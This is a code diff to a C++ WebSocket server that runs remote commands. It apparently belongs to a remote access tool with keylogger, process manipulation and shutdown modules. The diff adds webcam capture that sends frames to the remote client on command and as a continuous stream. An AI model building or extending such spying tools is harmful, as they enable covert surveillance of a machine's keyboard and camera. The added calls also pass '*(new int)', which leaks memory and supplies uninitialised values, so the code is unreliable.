@@ -55,6 +55,7 @@ WebSocketConnection::computeAcceptKey(const std::string &clientKey) {
 #include "api/keylogger.h"
 #include "api/process_manipulate.h"
 #include "api/shutdown_machine.h"
+#include "api/webcam.h"
 
 void WebSocketConnection::run() {
   performHandshake_();
@@ -75,9 +76,10 @@ void WebSocketConnection::run() {
       listen_keyboard();
     } else if (msg == "list_process") {
       sender_.sendText(listProcesses());
-    } else if (msg == "frame_capture") {
+    } else if (msg == "capture_webcam") {
       // Send single frame
-      capture_and_send_frame_ws(&sender_);
+      // capture_and_send_frame_ws(&sender_);
+      sender_.sendBinary(capture_webcam_frame(0, /*width*/ *(new int), /*height*/ *(new int)));
     } else if (msg == "start_stream") {
       streaming_ = true;
       sender_.sendText("Stream started");
@@ -85,7 +87,8 @@ void WebSocketConnection::run() {
     } else if (msg == "stop_stream") {
       streaming_ = false;
       sender_.sendText("Stream stopped");
-    } else {
+    } 
+    else {
       sender_.sendText(msg);
     }
   }
@@ -99,8 +102,8 @@ void WebSocketConnection::startFrameStream_() {
     auto start = std::chrono::steady_clock::now();
 
     // Capture and send frame
-    capture_and_send_frame_ws(&sender_);
-
+    // capture_and_send_frame_ws(&sender_);
+    sender_.sendBinary(capture_webcam_frame(0, /*width*/ *(new int), /*height*/ *(new int)));
     // Check for incoming messages (non-blocking)
     fd_set readfds;
     FD_ZERO(&readfds);
